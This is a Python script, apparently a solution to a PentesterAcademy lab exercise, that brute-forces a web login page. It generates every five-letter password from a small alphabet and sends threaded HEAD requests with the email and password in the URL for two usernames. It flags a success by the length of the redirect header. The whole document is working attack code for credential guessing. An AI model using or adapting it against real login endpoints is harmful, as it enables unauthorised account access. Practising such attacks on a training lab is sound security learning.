import itertools 
import time
from  threading import Thread
from queue import Queue 
import certifi
import urllib3

class ThreadUrl(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue
        
    def run(self) :
        while not self.queue.empty() :
            work = self.queue.get()
            http = urllib3.PoolManager(cert_reqs ='CERT_REQUIRED',ca_certs=certifi.where())
            try:
                httpResponse = http.request('HEAD', 'https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email='+work[0]+'%40PentesterAcademy.com&password=' + work[1],redirect=False)
            except :
                print("Error")
            if len(httpResponse.getheader('Location')) != 63:
                print(f'---------------------------------------------------------------------------------------------')
                print(f'-******************************************************************************************- ')
                print(f'-*************************** {work[1]} Is what you want for user {work[0]} ****************- ')
                print(f'-*************************** {httpResponse.getheader("Location")} ****************- ')
                print(f'-******************************************************************************************- ')
                print(f'---------------------------------------------------------------------------------------------')
                print("--- %s seconds ---" % (time.time() - start_time))
            else:
                print(f'______{work[1]} Is Not Valid For {work[0]} ')
            self.queue.task_done()
                                
start_time = time.time()
user = 'admin'
Args = 'xtzxy'
baseUrl = 'https://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email='+user+'%40PentesterAcademy.com&password='
print("Start Processing") 
request_queue = Queue()

def main():
    letters = itertools.product(['m', 'n', 'o'],repeat=int(5))
    for i in letters:
        x = "".join(i)
        request_queue.put(('admin',x))
        request_queue.put(('nick',x))
        worker = ThreadUrl(request_queue)
        worker.setDaemon(True)
        worker.start()
main()



  



